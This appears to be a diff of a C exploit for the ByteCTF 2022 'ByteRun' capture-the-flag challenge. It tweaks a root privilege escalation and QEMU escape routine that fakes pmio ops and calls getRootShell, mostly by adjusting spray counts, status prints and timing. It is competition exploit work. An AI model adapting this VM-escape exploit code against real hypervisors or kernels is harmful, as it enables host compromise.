@@ -24,7 +24,7 @@
 #define VICTIM_MSG_TYPE     0x1337
 #define MSG_TAG     0xAAAAAAAA
 
-#define SOCKET_NUM 4
+#define SOCKET_NUM 8
 #define SK_BUFF_NUM 128
 #define PIPE_NUM 256
 #define MSG_QUEUE_NUM 4096
@@ -351,6 +351,8 @@ void qemuEscape(void)
 
     write(dev_fd, buf, BYTEDEV_SECTOR_SIZE);
 
+    puts("\033[32m\033[1m[+] Done!\033[0m");
+
     /**
      * Step.III change pmio->ops to fake ops on opaque
      */
@@ -364,6 +366,8 @@ void qemuEscape(void)
     buf[9] = opaque + 50 * 8;
     write(dev_fd, buf, 10 * sizeof(uint64_t));
 
+    puts("\033[32m\033[1m[+] Done!\033[0m");
+
     /**
      * Step.IV trigger fake pmio->ops.read to escape
      * There we need to set opaque[1] to opaque.parent_obj.name
@@ -373,7 +377,7 @@ void qemuEscape(void)
     puts("");
     puts("\033[34m\033[1m[*] Step.IV trigger fake ops to escape\033[0m");
 
-    sleep(5);
+    //sleep(5);
     ioctl(dev_fd, BYTEDEV_MODE_CHANGE, *(size_t*)"arttnba3");
 }
 
@@ -395,10 +399,6 @@ void getRootShell(void)
 
 int main(int argc, char **argv, char **envp)
 {
-    if (argc == 2) {
-        qemuEscape();
-        return 0;
-    }
     int         oob_socket[2];
     int         sk_sockets[SOCKET_NUM][2];
     int         pipe_fd[PIPE_NUM][2];
@@ -421,7 +421,7 @@ int main(int argc, char **argv, char **envp)
      * Step.0
      * Initialization
      */
-    puts("\033[34m\033[1m\n[*] ByteCTF 2022 - ByteRun - exploit \033[0m\n");
+    puts("\033[32m\033[1m\n[+] ByteCTF 2022 - ByteRun - exploit \033[0m\n");
     puts("\033[34m\033[1m\n[*] Stage I - ROOT Privilege Escalation. \033[0m\n");
 
     /* basic resources alloc */
